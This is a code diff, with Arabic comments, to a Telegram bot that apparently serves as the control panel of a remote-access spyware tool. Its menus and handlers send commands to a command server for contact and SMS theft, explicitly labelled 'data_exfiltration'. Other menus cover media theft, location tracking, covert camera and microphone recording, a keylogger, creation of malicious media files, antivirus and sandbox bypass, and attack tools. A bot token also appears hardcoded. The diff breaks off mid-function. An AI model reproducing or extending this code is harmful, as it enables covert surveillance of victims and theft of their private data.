@@ -81,6 +81,27 @@ BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', "7305811865:AAF_PKkBWEUw-QdL1ee
 OWNER_USER_ID = int(os.environ.get('OWNER_USER_ID', 985612253))
 bot = telebot.TeleBot(BOT_TOKEN)
 DB_FILE = 'devices.db'
+
+# تهيئة مدير الأجهزة
+device_manager = DeviceManager(DB_FILE)
+
+# تهيئة منفذ الأوامر مع الربط الحقيقي
+command_executor = CommandExecutor(COMMAND_SERVER_URL)
+
+# تهيئة منفذ الأوامر المتقدمة
+advanced_command_executor = AdvancedCommandExecutor(COMMAND_SERVER_URL)
+
+# تهيئة مدير الأمان
+security_manager = SecurityManager()
+
+# تهيئة محلل الأوامر المتقدمة
+command_parser = AdvancedCommandParser()
+
+# إعداد المستخدمين المصرح لهم
+setup_authorized_users()
+
+# تشغيل المجدول
+run_scheduler()
 # تحديد رابط خادم الأوامر بناءً على البيئة
 def get_command_server_url():
     """تحديد رابط خادم الأوامر بناءً على البيئة"""
@@ -91,10 +112,10 @@ def get_command_server_url():
     
     # التحقق من البيئة المحلية
     if os.environ.get('NODE_ENV') == 'development' or os.environ.get('LOCAL_DEVELOPMENT'):
-        return 'http://localhost:10001'
+        return 'http://localhost:8080'  # منفذ خادم الأوامر الحقيقي
     
     # الرابط الافتراضي للإنتاج
-    return 'https://remote-control-command-server.onrender.com'
+    return 'http://localhost:8080'  # استخدام المنفذ المحلي
 
 COMMAND_SERVER_URL = get_command_server_url()
 
@@ -376,13 +397,25 @@ class CommandExecutor:
         self.reconnect_interval = 5000
 
     def check_connection(self) -> bool:
-        """فحص الاتصال بالخادم"""
+        """فحص الاتصال بالخادم الحقيقي"""
         try:
-            response = requests.get(f'{self.server_url}/stats', timeout=5)
+            response = requests.get(f'{self.server_url}/status', timeout=5)
             self.is_connected = response.status_code == 200
+            if self.is_connected:
+                logger.info("✅ الاتصال بالخادم نشط")
+            else:
+                logger.warning("⚠️ الخادم متصل ولكن غير مستجيب")
             return self.is_connected
+        except requests.exceptions.ConnectionError:
+            logger.error("❌ لا يمكن الاتصال بالخادم")
+            self.is_connected = False
+            return False
+        except requests.exceptions.Timeout:
+            logger.error("⏰ انتهت مهلة الاتصال بالخادم")
+            self.is_connected = False
+            return False
         except Exception as e:
-            logger.error(f"خطأ في فحص الاتصال: {e}")
+            logger.error(f"❌ خطأ في فحص الاتصال: {e}")
             self.is_connected = False
             return False
 
@@ -393,7 +426,7 @@ class CommandExecutor:
         return base64.b64encode(data.encode()).decode()
 
     def send_command(self, device_id: str, command: str, parameters: dict = None) -> dict:
-        """إرسال أمر للجهاز"""
+        """إرسال أمر للجهاز عبر خادم الأوامر الحقيقي"""
         try:
             # فحص الاتصال أولاً
             if not self.check_connection():
@@ -401,80 +434,96 @@ class CommandExecutor:
                 self.save_pending_command(device_id, command, parameters)
                 return {'status': 'pending', 'message': 'الخادم غير متصل، سيتم تنفيذ الأمر عند الاتصال'}
 
-            # الحصول على مفتاح التشفير للجهاز
-            encryption_key = device_manager.get_device_encryption_key(device_id)
-            
-            # تشفير المعلمات إذا كان التشفير مفعلاً
-            encrypted_params = None
-            if SECURITY_CONFIG['enable_encryption'] and encryption_key:
-                params_str = json.dumps(parameters) if parameters else '{}'
-                encrypted_params = self.encrypt_data(params_str, encryption_key)
-            else:
-                encrypted_params = parameters
-
+            # إعداد البيانات للإرسال
             payload = {
-                'deviceId': device_id,
+                'client_id': device_id,
                 'command': command,
-                'parameters': encrypted_params or {}
+                'parameters': parameters or {},
+                'timestamp': time.time(),
+                'user_id': 'telegram_bot'
             }
 
+            # إرسال الأمر للخادم
             response = requests.post(
-                f'{self.server_url}/send-command',
+                f'{self.server_url}/command',
                 json=payload,
+                headers={'Content-Type': 'application/json'},
                 timeout=SECURITY_CONFIG['command_timeout']
             )
 
             if response.status_code == 200:
-                return response.json()
+                result = response.json()
+                logger.info(f"تم إرسال الأمر بنجاح: {command} للجهاز {device_id}")
+                return result
             else:
                 # حفظ الأمر محلياً في حالة الفشل
                 self.save_pending_command(device_id, command, parameters)
+                logger.error(f"خطأ في الخادم: {response.status_code} - {response.text}")
                 return {'error': f'خطأ في الخادم: {response.status_code}'}
 
         except requests.exceptions.Timeout:
             self.save_pending_command(device_id, command, parameters)
+            logger.error(f"انتهت مهلة الاتصال للجهاز {device_id}")
             return {'error': 'انتهت مهلة الاتصال'}
         except requests.exceptions.RequestException as e:
             self.save_pending_command(device_id, command, parameters)
+            logger.error(f"خطأ في الاتصال: {str(e)}")
             return {'error': f'خطأ في الاتصال: {str(e)}'}
+        except Exception as e:
+            logger.error(f"خطأ غير متوقع: {str(e)}")
+            return {'error': f'خطأ غير متوقع: {str(e)}'}
 
     def get_device_status(self, device_id: str) -> dict:
-        """الحصول على حالة الجهاز"""
+        """الحصول على حالة الجهاز من الخادم الحقيقي"""
         try:
             if not self.check_connection():
                 return {'error': 'الخادم غير متصل'}
 
             response = requests.get(
-                f'{self.server_url}/device-status/{device_id}',
+                f'{self.server_url}/client-status/{device_id}',
                 timeout=10
             )
 
             if response.status_code == 200:
-                return response.json()
+                result = response.json()
+                logger.info(f"تم جلب حالة الجهاز: {device_id}")
+                return result
             else:
+                logger.error(f"خطأ في جلب حالة الجهاز: {response.status_code}")
                 return {'error': f'خطأ في الخادم: {response.status_code}'}
 
         except requests.exceptions.RequestException as e:
+            logger.error(f"خطأ في الاتصال لجلب حالة الجهاز: {str(e)}")
             return {'error': f'خطأ في الاتصال: {str(e)}'}
+        except Exception as e:
+            logger.error(f"خطأ غير متوقع في جلب حالة الجهاز: {str(e)}")
+            return {'error': f'خطأ غير متوقع: {str(e)}'}
 
     def get_connected_devices(self) -> dict:
-        """الحصول على قائمة الأجهزة المتصلة"""
+        """الحصول على قائمة الأجهزة المتصلة من الخادم الحقيقي"""
         try:
             if not self.check_connection():
                 return {'error': 'الخادم غير متصل'}
 
             response = requests.get(
-                f'{self.server_url}/devices',
+                f'{self.server_url}/clients',
                 timeout=10
             )
 
             if response.status_code == 200:
-                return response.json()
+                result = response.json()
+                logger.info(f"تم جلب {len(result.get('clients', []))} جهاز متصل")
+                return result
             else:
+                logger.error(f"خطأ في جلب الأجهزة المتصلة: {response.status_code}")
                 return {'error': f'خطأ في الخادم: {response.status_code}'}
 
         except requests.exceptions.RequestException as e:
+            logger.error(f"خطأ في الاتصال لجلب الأجهزة: {str(e)}")
             return {'error': f'خطأ في الاتصال: {str(e)}'}
+        except Exception as e:
+            logger.error(f"خطأ غير متوقع في جلب الأجهزة: {str(e)}")
+            return {'error': f'خطأ غير متوقع: {str(e)}'}
 
     def save_pending_command(self, device_id: str, command: str, parameters: dict = None):
         """حفظ الأمر محلياً للتنفيذ لاحقاً"""
@@ -1051,6 +1100,71 @@ scheduler_thread.start()
 # معالجة الأوامر
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
+    """رسالة الترحيب مع القائمة الرئيسية التفاعلية"""
+    if not is_owner(message.from_user.id):
+        bot.reply_to(message, "❌ غير مصرح لك باستخدام هذا البوت.")
+        return
+    
+    # إنشاء القائمة الرئيسية التفاعلية
+    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
+    
+    # أزرار إدارة الأجهزة
+    markup.add(
+        telebot.types.InlineKeyboardButton("📱 إدارة الأجهزة", callback_data="devices_menu"),
+        telebot.types.InlineKeyboardButton("🔗 ربط جهاز جديد", callback_data="link_device")
+    )
+    
+    # أزرار استخراج البيانات
+    markup.add(
+        telebot.types.InlineKeyboardButton("📞 جهات الاتصال", callback_data="contacts_menu"),
+        telebot.types.InlineKeyboardButton("💬 الرسائل", callback_data="sms_menu"),
+        telebot.types.InlineKeyboardButton("📁 الوسائط", callback_data="media_menu"),
+        telebot.types.InlineKeyboardButton("📍 الموقع", callback_data="location_menu")
+    )
+    
+    # أزرار المراقبة
+    markup.add(
+        telebot.types.InlineKeyboardButton("📸 لقطة شاشة", callback_data="screenshot_menu"),
+        telebot.types.InlineKeyboardButton("🎥 تسجيل الكاميرا", callback_data="record_menu"),
+        telebot.types.InlineKeyboardButton("🎤 تسجيل الميكروفون", callback_data="mic_record_menu"),
+        telebot.types.InlineKeyboardButton("⌨️ تسجيل المفاتيح", callback_data="keylogger_menu")
+    )
+    
+    # أزرار الهجمات المتقدمة
+    markup.add(
+        telebot.types.InlineKeyboardButton("🔨 الهجمات المتقدمة", callback_data="advanced_attacks_menu"),
+        telebot.types.InlineKeyboardButton("💉 حقن الوسائط", callback_data="media_injection_menu"),
+        telebot.types.InlineKeyboardButton("🛡️ تجاوز الحماية", callback_data="bypass_menu")
+    )
+    
+    # أزرار التحكم في النظام
+    markup.add(
+        telebot.types.InlineKeyboardButton("⚙️ التحكم في النظام", callback_data="system_control_menu"),
+        telebot.types.InlineKeyboardButton("🔧 الأدوات المتقدمة", callback_data="tools_menu"),
+        telebot.types.InlineKeyboardButton("📊 الإحصائيات", callback_data="stats_menu")
+    )
+    
+    # أزرار المساعدة والإعدادات
+    markup.add(
+        telebot.types.InlineKeyboardButton("❓ المساعدة", callback_data="help_menu"),
+        telebot.types.InlineKeyboardButton("⚙️ الإعدادات", callback_data="settings_menu")
+    )
+    
+    welcome_text = f"""
+🚀 **مرحباً بك في نظام التحكم عن بعد المتقدم**
+
+👤 **المستخدم:** {message.from_user.first_name}
+🆔 **الرقم:** {message.from_user.id}
+⏰ **الوقت:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+
+🔧 **النظام جاهز للاستخدام**
+📱 **اختر من القائمة أدناه:**
+    """
+    
+    bot.reply_to(message, welcome_text, parse_mode='Markdown', reply_markup=markup)
+    
+    # تسجيل النشاط
+    device_manager.log_activity(message.from_user.id, 'start_bot', 'User started the bot')
     """معالجة أمر البداية"""
     user_id = message.from_user.id
     
@@ -2703,6 +2817,57 @@ def control_system(message):
 
 
 # معالجة الرسائل النصية
+# معالج الأزرار التفاعلية
+@bot.callback_query_handler(func=lambda call: True)
+def handle_callback_query(call):
+    """معالجة الأزرار التفاعلية"""
+    try:
+        if call.data == "devices_menu":
+            show_devices_menu(call.message)
+        elif call.data == "link_device":
+            show_link_device_menu(call.message)
+        elif call.data == "contacts_menu":
+            show_contacts_menu(call.message)
+        elif call.data == "sms_menu":
+            show_sms_menu(call.message)
+        elif call.data == "media_menu":
+            show_media_menu(call.message)
+        elif call.data == "location_menu":
+            show_location_menu(call.message)
+        elif call.data == "screenshot_menu":
+            show_screenshot_menu(call.message)
+        elif call.data == "record_menu":
+            show_record_menu(call.message)
+        elif call.data == "mic_record_menu":
+            show_mic_record_menu(call.message)
+        elif call.data == "keylogger_menu":
+            show_keylogger_menu(call.message)
+        elif call.data == "advanced_attacks_menu":
+            show_advanced_attacks_menu(call.message)
+        elif call.data == "media_injection_menu":
+            show_media_injection_menu(call.message)
+        elif call.data == "bypass_menu":
+            show_bypass_menu(call.message)
+        elif call.data == "system_control_menu":
+            show_system_control_menu(call.message)
+        elif call.data == "tools_menu":
+            show_tools_menu(call.message)
+        elif call.data == "stats_menu":
+            show_stats_menu(call.message)
+        elif call.data == "help_menu":
+            show_help_menu(call.message)
+        elif call.data == "settings_menu":
+            show_settings_menu(call.message)
+        elif call.data == "back_to_main":
+            send_welcome(call.message)
+        else:
+            # معالجة الأوامر الفرعية
+            handle_submenu_callback(call)
+            
+    except Exception as e:
+        bot.answer_callback_query(call.id, f"❌ خطأ: {str(e)}")
+        logger.error(f"خطأ في معالجة الأزرار: {e}")
+
 @bot.message_handler(func=lambda message: True)
 def handle_text_message(message):
     """معالجة الرسائل النصية"""
@@ -4118,6 +4283,873 @@ def handle_media_test(message, device_id):
 • تحقق من وجود جميع الملفات المطلوبة
         """
         bot.reply_to(message, error_text, parse_mode='Markdown')
+
+# دوال القوائم التفاعلية
+def show_devices_menu(message):
+    """عرض قائمة إدارة الأجهزة"""
+    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
+    
+    # الحصول على الأجهزة المتاحة
+    devices = device_manager.get_user_devices(message.from_user.id)
+    
+    if devices:
+        for device_id, status, created_at in devices:
+            markup.add(
+                telebot.types.InlineKeyboardButton(
+                    f"📱 {device_id[:8]}... ({status})", 
+                    callback_data=f"select_device_{device_id}"
+                )
+            )
+    else:
+        markup.add(
+            telebot.types.InlineKeyboardButton("❌ لا توجد أجهزة", callback_data="no_devices")
+        )
+    
+    markup.add(
+        telebot.types.InlineKeyboardButton("🔗 ربط جهاز جديد", callback_data="link_device"),
+        telebot.types.InlineKeyboardButton("🔄 تحديث", callback_data="refresh_devices"),
+        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
+    )
+    
+    text = """
+📱 **إدارة الأجهزة**
+
+اختر الجهاز الذي تريد التحكم به:
+    """
+    
+    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)
+
+def show_link_device_menu(message):
+    """عرض قائمة ربط جهاز جديد"""
+    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
+    
+    markup.add(
+        telebot.types.InlineKeyboardButton("📱 Android", callback_data="link_android"),
+        telebot.types.InlineKeyboardButton("🍎 iOS", callback_data="link_ios"),
+        telebot.types.InlineKeyboardButton("💻 Windows", callback_data="link_windows"),
+        telebot.types.InlineKeyboardButton("🐧 Linux", callback_data="link_linux"),
+        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
+    )
+    
+    text = """
+🔗 **ربط جهاز جديد**
+
+اختر نوع الجهاز الذي تريد ربطه:
+    """
+    
+    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)
+
+def show_contacts_menu(message):
+    """عرض قائمة جهات الاتصال"""
+    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
+    
+    markup.add(
+        telebot.types.InlineKeyboardButton("📞 نسخ جميع الجهات", callback_data="contacts_backup_all"),
+        telebot.types.InlineKeyboardButton("🔍 البحث في الجهات", callback_data="contacts_search"),
+        telebot.types.InlineKeyboardButton("📊 إحصائيات الجهات", callback_data="contacts_stats"),
+        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
+    )
+    
+    text = """
+📞 **إدارة جهات الاتصال**
+
+اختر العملية المطلوبة:
+    """
+    
+    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)
+
+def show_sms_menu(message):
+    """عرض قائمة الرسائل"""
+    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
+    
+    markup.add(
+        telebot.types.InlineKeyboardButton("💬 نسخ جميع الرسائل", callback_data="sms_backup_all"),
+        telebot.types.InlineKeyboardButton("📱 رسائل واردة", callback_data="sms_inbox"),
+        telebot.types.InlineKeyboardButton("📤 رسائل صادرة", callback_data="sms_sent"),
+        telebot.types.InlineKeyboardButton("🗑️ رسائل محذوفة", callback_data="sms_deleted"),
+        telebot.types.InlineKeyboardButton("🔍 البحث في الرسائل", callback_data="sms_search"),
+        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
+    )
+    
+    text = """
+💬 **إدارة الرسائل النصية**
+
+اختر العملية المطلوبة:
+    """
+    
+    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)
+
+def show_media_menu(message):
+    """عرض قائمة الوسائط"""
+    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
+    
+    markup.add(
+        telebot.types.InlineKeyboardButton("📸 الصور", callback_data="media_photos"),
+        telebot.types.InlineKeyboardButton("🎥 الفيديوهات", callback_data="media_videos"),
+        telebot.types.InlineKeyboardButton("🎵 الملفات الصوتية", callback_data="media_audio"),
+        telebot.types.InlineKeyboardButton("📄 المستندات", callback_data="media_documents"),
+        telebot.types.InlineKeyboardButton("📁 جميع الملفات", callback_data="media_all"),
+        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
+    )
+    
+    text = """
+📁 **إدارة الوسائط**
+
+اختر نوع الوسائط:
+    """
+    
+    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)
+
+def show_location_menu(message):
+    """عرض قائمة الموقع"""
+    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
+    
+    markup.add(
+        telebot.types.InlineKeyboardButton("📍 الموقع الحالي", callback_data="location_current"),
+        telebot.types.InlineKeyboardButton("🗺️ تتبع الموقع", callback_data="location_track"),
+        telebot.types.InlineKeyboardButton("📊 سجل المواقع", callback_data="location_history"),
+        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
+    )
+    
+    text = """
+📍 **إدارة الموقع**
+
+اختر العملية المطلوبة:
+    """
+    
+    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)
+
+def show_screenshot_menu(message):
+    """عرض قائمة لقطة الشاشة"""
+    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
+    
+    markup.add(
+        telebot.types.InlineKeyboardButton("📸 لقطة شاشة عادية", callback_data="screenshot_normal"),
+        telebot.types.InlineKeyboardButton("📸 لقطة شاشة كاملة", callback_data="screenshot_full"),
+        telebot.types.InlineKeyboardButton("📸 لقطة شاشة متسلسلة", callback_data="screenshot_series"),
+        telebot.types.InlineKeyboardButton("📸 لقطة شاشة تلقائية", callback_data="screenshot_auto"),
+        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
+    )
+    
+    text = """
+📸 **لقطة الشاشة**
+
+اختر نوع اللقطة:
+    """
+    
+    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)
+
+def show_record_menu(message):
+    """عرض قائمة تسجيل الكاميرا"""
+    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
+    
+    markup.add(
+        telebot.types.InlineKeyboardButton("🎥 تسجيل الكاميرا الأمامية", callback_data="record_front"),
+        telebot.types.InlineKeyboardButton("🎥 تسجيل الكاميرا الخلفية", callback_data="record_back"),
+        telebot.types.InlineKeyboardButton("🎥 تسجيل متسلسل", callback_data="record_series"),
+        telebot.types.InlineKeyboardButton("🎥 تسجيل تلقائي", callback_data="record_auto"),
+        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
+    )
+    
+    text = """
+🎥 **تسجيل الكاميرا**
+
+اختر نوع التسجيل:
+    """
+    
+    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)
+
+def show_mic_record_menu(message):
+    """عرض قائمة تسجيل الميكروفون"""
+    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
+    
+    markup.add(
+        telebot.types.InlineKeyboardButton("🎤 تسجيل قصير (30 ث)", callback_data="mic_record_30"),
+        telebot.types.InlineKeyboardButton("🎤 تسجيل متوسط (2 د)", callback_data="mic_record_120"),
+        telebot.types.InlineKeyboardButton("🎤 تسجيل طويل (5 د)", callback_data="mic_record_300"),
+        telebot.types.InlineKeyboardButton("🎤 تسجيل تلقائي", callback_data="mic_record_auto"),
+        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
+    )
+    
+    text = """
+🎤 **تسجيل الميكروفون**
+
+اختر مدة التسجيل:
+    """
+    
+    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)
+
+def show_keylogger_menu(message):
+    """عرض قائمة تسجيل المفاتيح"""
+    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
+    
+    markup.add(
+        telebot.types.InlineKeyboardButton("⌨️ بدء التسجيل", callback_data="keylogger_start"),
+        telebot.types.InlineKeyboardButton("⏹️ إيقاف التسجيل", callback_data="keylogger_stop"),
+        telebot.types.InlineKeyboardButton("📊 عرض البيانات", callback_data="keylogger_data"),
+        telebot.types.InlineKeyboardButton("🗑️ حذف البيانات", callback_data="keylogger_clear"),
+        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
+    )
+    
+    text = """
+⌨️ **تسجيل المفاتيح**
+
+اختر العملية المطلوبة:
+    """
+    
+    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)
+
+def show_advanced_attacks_menu(message):
+    """عرض قائمة الهجمات المتقدمة"""
+    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
+    
+    markup.add(
+        telebot.types.InlineKeyboardButton("📶 هجوم الواي فاي", callback_data="attack_wifi"),
+        telebot.types.InlineKeyboardButton("📱 هجوم الأجهزة المحمولة", callback_data="attack_mobile"),
+        telebot.types.InlineKeyboardButton("🔐 هجوم كسر التشفير", callback_data="attack_crypto"),
+        telebot.types.InlineKeyboardButton("🌐 هجوم الويب", callback_data="attack_web"),
+        telebot.types.InlineKeyboardButton("💉 هجوم الحقن", callback_data="attack_injection"),
+        telebot.types.InlineKeyboardButton("🛡️ هجوم تجاوز الحماية", callback_data="attack_bypass"),
+        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
+    )
+    
+    text = """
+🔨 **الهجمات المتقدمة**
+
+اختر نوع الهجوم:
+    """
+    
+    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)
+
+def show_media_injection_menu(message):
+    """عرض قائمة حقن الوسائط"""
+    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
+    
+    markup.add(
+        telebot.types.InlineKeyboardButton("📸 حقن في الصور", callback_data="injection_images"),
+        telebot.types.InlineKeyboardButton("🎥 حقن في الفيديوهات", callback_data="injection_videos"),
+        telebot.types.InlineKeyboardButton("🎵 حقن في الصوت", callback_data="injection_audio"),
+        telebot.types.InlineKeyboardButton("📄 حقن في المستندات", callback_data="injection_documents"),
+        telebot.types.InlineKeyboardButton("💉 إنشاء وسائط خبيثة", callback_data="injection_create"),
+        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
+    )
+    
+    text = """
+💉 **حقن الوسائط**
+
+اختر نوع الحقن:
+    """
+    
+    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)
+
+def show_bypass_menu(message):
+    """عرض قائمة تجاوز الحماية"""
+    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
+    
+    markup.add(
+        telebot.types.InlineKeyboardButton("🛡️ تجاوز مضاد الفيروسات", callback_data="bypass_antivirus"),
+        telebot.types.InlineKeyboardButton("🔥 تجاوز الجدار الناري", callback_data="bypass_firewall"),
+        telebot.types.InlineKeyboardButton("🔍 تجاوز نظام الكشف", callback_data="bypass_ids"),
+        telebot.types.InlineKeyboardButton("📦 تجاوز الحاوية", callback_data="bypass_sandbox"),
+        telebot.types.InlineKeyboardButton("🔬 تجاوز التحليل", callback_data="bypass_analysis"),
+        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
+    )
+    
+    text = """
+🛡️ **تجاوز الحماية**
+
+اختر نوع التجاوز:
+    """
+    
+    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)
+
+def show_system_control_menu(message):
+    """عرض قائمة التحكم في النظام"""
+    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
+    
+    markup.add(
+        telebot.types.InlineKeyboardButton("⚙️ معلومات النظام", callback_data="system_info"),
+        telebot.types.InlineKeyboardButton("🔄 إعادة تشغيل", callback_data="system_restart"),
+        telebot.types.InlineKeyboardButton("🛑 إيقاف", callback_data="system_shutdown"),
+        telebot.types.InlineKeyboardButton("📊 مراقبة الأداء", callback_data="system_monitor"),
+        telebot.types.InlineKeyboardButton("🔧 إدارة العمليات", callback_data="system_processes"),
+        telebot.types.InlineKeyboardButton("🌐 إدارة الشبكة", callback_data="system_network"),
+        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
+    )
+    
+    text = """
+⚙️ **التحكم في النظام**
+
+اختر العملية المطلوبة:
+    """
+    
+    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)
+
+def show_tools_menu(message):
+    """عرض قائمة الأدوات المتقدمة"""
+    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
+    
+    markup.add(
+        telebot.types.InlineKeyboardButton("🔧 Metasploit", callback_data="tool_metasploit"),
+        telebot.types.InlineKeyboardButton("📱 ADB", callback_data="tool_adb"),
+        telebot.types.InlineKeyboardButton("🔐 Hashcat", callback_data="tool_hashcat"),
+        telebot.types.InlineKeyboardButton("📶 Aircrack", callback_data="tool_aircrack"),
+        telebot.types.InlineKeyboardButton("💉 Payload Generator", callback_data="tool_payload"),
+        telebot.types.InlineKeyboardButton("🛡️ Exploit Framework", callback_data="tool_exploit"),
+        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
+    )
+    
+    text = """
+🔧 **الأدوات المتقدمة**
+
+اختر الأداة المطلوبة:
+    """
+    
+    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)
+
+def show_stats_menu(message):
+    """عرض قائمة الإحصائيات"""
+    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
+    
+    markup.add(
+        telebot.types.InlineKeyboardButton("📊 إحصائيات الهجمات", callback_data="stats_attacks"),
+        telebot.types.InlineKeyboardButton("📱 إحصائيات الأجهزة", callback_data="stats_devices"),
+        telebot.types.InlineKeyboardButton("💾 إحصائيات البيانات", callback_data="stats_data"),
+        telebot.types.InlineKeyboardButton("⚡ إحصائيات الأداء", callback_data="stats_performance"),
+        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
+    )
+    
+    text = """
+📊 **الإحصائيات**
+
+اختر نوع الإحصائيات:
+    """
+    
+    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)
+
+def show_help_menu(message):
+    """عرض قائمة المساعدة"""
+    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
+    
+    markup.add(
+        telebot.types.InlineKeyboardButton("📖 دليل الاستخدام", callback_data="help_guide"),
+        telebot.types.InlineKeyboardButton("🔧 استكشاف الأخطاء", callback_data="help_troubleshoot"),
+        telebot.types.InlineKeyboardButton("📞 الدعم الفني", callback_data="help_support"),
+        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
+    )
+    
+    text = """
+❓ **المساعدة**
+
+اختر ما تحتاج إليه:
+    """
+    
+    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)
+
+def show_settings_menu(message):
+    """عرض قائمة الإعدادات"""
+    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
+    
+    markup.add(
+        telebot.types.InlineKeyboardButton("🔒 إعدادات الأمان", callback_data="settings_security"),
+        telebot.types.InlineKeyboardButton("⚙️ إعدادات النظام", callback_data="settings_system"),
+        telebot.types.InlineKeyboardButton("📊 إعدادات المراقبة", callback_data="settings_monitoring"),
+        telebot.types.InlineKeyboardButton("🌐 إعدادات الشبكة", callback_data="settings_network"),
+        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
+    )
+    
+    text = """
+⚙️ **الإعدادات**
+
+اختر نوع الإعدادات:
+    """
+    
+    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)
+
+def handle_submenu_callback(call):
+    """معالجة الأوامر الفرعية"""
+    try:
+        data = call.data
+        
+        if data.startswith("select_device_"):
+            device_id = data.replace("select_device_", "")
+            select_device_interactive(call.message, device_id)
+        elif data.startswith("contacts_"):
+            handle_contacts_callback(call)
+        elif data.startswith("sms_"):
+            handle_sms_callback(call)
+        elif data.startswith("media_"):
+            handle_media_callback(call)
+        elif data.startswith("attack_"):
+            handle_attack_callback(call)
+        elif data.startswith("injection_"):
+            handle_injection_callback(call)
+        elif data.startswith("bypass_"):
+            handle_bypass_callback(call)
+        elif data.startswith("system_"):
+            handle_system_callback(call)
+        elif data.startswith("tool_"):
+            handle_tool_callback(call)
+        elif data.startswith("stats_"):
+            handle_stats_callback(call)
+        else:
+            bot.answer_callback_query(call.id, "❌ أمر غير معروف")
+            
+    except Exception as e:
+        bot.answer_callback_query(call.id, f"❌ خطأ: {str(e)}")
+        logger.error(f"خطأ في معالجة الأوامر الفرعية: {e}")
+
+def select_device_interactive(message, device_id):
+    """اختيار جهاز تفاعلي"""
+    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
+    
+    markup.add(
+        telebot.types.InlineKeyboardButton("📱 معلومات الجهاز", callback_data=f"device_info_{device_id}"),
+        telebot.types.InlineKeyboardButton("📊 حالة الجهاز", callback_data=f"device_status_{device_id}"),
+        telebot.types.InlineKeyboardButton("🔧 التحكم في الجهاز", callback_data=f"device_control_{device_id}"),
+        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="devices_menu")
+    )
+    
+    text = f"""
+📱 **الجهاز المحدد**
+
+🆔 **معرف الجهاز:** `{device_id}`
+⏰ **وقت الاختيار:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+
+اختر العملية المطلوبة:
+    """
+    
+    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)
+
+def handle_contacts_callback(call):
+    """معالجة أوامر جهات الاتصال مع الربط الحقيقي"""
+    data = call.data
+    
+    if data == "contacts_backup_all":
+        # تنفيذ نسخ جميع جهات الاتصال
+        device_id = get_selected_device(call.from_user.id)
+        if device_id:
+            # إرسال الأمر الحقيقي للخادم
+            result = command_executor.send_command(device_id, "data_exfiltration", {
+                "type": "contacts",
+                "action": "backup_all",
+                "format": "json"
+            })
+            
+            if result.get('success') or result.get('status') == 'success':
+                bot.answer_callback_query(call.id, "✅ تم نسخ جميع جهات الاتصال")
+                logger.info(f"تم نسخ جهات الاتصال للجهاز {device_id}")
+            else:
+                error_msg = result.get('error', 'خطأ غير معروف')
